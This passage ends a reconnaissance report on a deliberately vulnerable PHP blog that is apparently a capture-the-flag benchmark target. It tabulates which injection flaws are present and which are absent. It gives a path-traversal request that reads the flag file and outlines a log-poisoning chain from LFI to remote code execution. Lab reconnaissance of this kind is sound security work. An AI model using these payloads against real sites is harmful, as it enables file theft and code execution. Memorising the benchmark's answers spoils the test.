**Conclusion:** SQL Injection is **NOT APPLICABLE** - no database queries exist.

---

### NOT FOUND: Command Injection

**Reason:** Application uses **NO system command execution functions**.

**Evidence:**
- ✓ Searched for `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`
- ✓ Result: 0 matches in application code
- ✓ No shell command invocations

**Conclusion:** Command Injection is **NOT APPLICABLE** - no command execution exists.

**Note:** However, RCE is still possible via LFI + log poisoning attack chain (see LFI section above).

---

### NOT FOUND: Server-Side Template Injection (SSTI)

**Reason:** Application uses **NO template engine**.

**Evidence:**
- ✓ No Smarty, Twig, Blade, or other template engine
- ✓ Direct PHP echo/print statements only
- ✓ Heredoc syntax used for HTML content in post files (not a template engine)

**Conclusion:** SSTI is **NOT APPLICABLE** - no template engine exists.

---

### NOT FOUND: Deserialization

**Reason:** Application uses **NO serialization/deserialization**.

**Evidence:**
- ✓ Searched for `unserialize()`, `serialize()`
- ✓ Result: 0 matches in application code
- ✓ Only JSON decoding used (json_decode() on static file)

**Conclusion:** Deserialization vulnerabilities are **NOT APPLICABLE**.

---

### NOT FOUND: XML/XXE Injection

**Reason:** Application uses **NO XML parsing**.

**Evidence:**
- ✓ Searched for `simplexml_load_string()`, `simplexml_load_file()`, `DOMDocument`, `XMLReader`
- ✓ Result: 0 matches in application code
- ✓ Only JSON used for data storage

**Conclusion:** XML/XXE is **NOT APPLICABLE** - no XML processing exists.

---

### NOT FOUND: LDAP Injection

**Reason:** Application uses **NO LDAP queries**.

**Evidence:**
- ✓ Searched for `ldap_search()`, `ldap_bind()`, `ldap_connect()`
- ✓ Result: 0 matches in application code

**Conclusion:** LDAP Injection is **NOT APPLICABLE**.

---

### Summary of Injection Sources

| Injection Type | Found | Location | Severity | Exploitability |
|----------------|-------|----------|----------|----------------|
| **Local File Inclusion (LFI)** | ✅ YES | post.php:4-11 | **CRITICAL** | Trivial - single HTTP request |
| **Path Traversal** | ✅ YES | post.php:4-11 (same as LFI) | **CRITICAL** | Trivial |
| **Cross-Site Scripting (XSS)** | ✅ YES | contact.php:66,71,76 | **HIGH** | Easy - requires victim interaction |
| **Remote Code Execution (RCE)** | ✅ YES | Via LFI + log poisoning | **CRITICAL** | Moderate - multi-step attack |
| SQL Injection | ❌ NO | N/A | N/A | No database |
| Command Injection | ❌ NO | N/A | N/A | No exec functions |
| SSTI | ❌ NO | N/A | N/A | No template engine |
| Deserialization | ❌ NO | N/A | N/A | No unserialize() |
| XML/XXE | ❌ NO | N/A | N/A | No XML parsing |
| LDAP Injection | ❌ NO | N/A | N/A | No LDAP |

**Primary Attack Vector:** Local File Inclusion (LFI) in `post.php?id` parameter

**Direct Path to CTF Flag:**
```
GET /post.php?id=../../FLAG.php
```

**Advanced RCE Attack Chain:**
```
1. Poison Apache access log with PHP code via User-Agent header
2. Include poisoned log via LFI: post.php?id=../../../../var/log/apache2/access.log
3. Execute arbitrary PHP code with www-data privileges
4. Read /FLAG.php via RCE or exfiltrate other sensitive data
```

---

## RECONNAISSANCE COMPLETE

This comprehensive reconnaissance deliverable maps the complete attack surface of the XBEN-061-24 Encoder64 Blog application. The primary finding is a **CRITICAL Local File Inclusion (LFI) vulnerability** in the unauthenticated `/post.php` endpoint that provides direct access to the FLAG file and enables Remote Code Execution via log poisoning.

**Key Takeaways:**
- **Zero authentication/authorization** - all vulnerabilities are externally exploitable
- **One-request flag capture** - `GET /post.php?id=../../FLAG.php`
- **Multiple attack vectors** - LFI, XSS, RCE via log poisoning
- **No defense in depth** - no security controls at any layer

**Next Phase:** Vulnerability analysis specialists will use this map to conduct in-depth exploitation research focusing on the LFI vulnerability and XSS vectors identified in this report.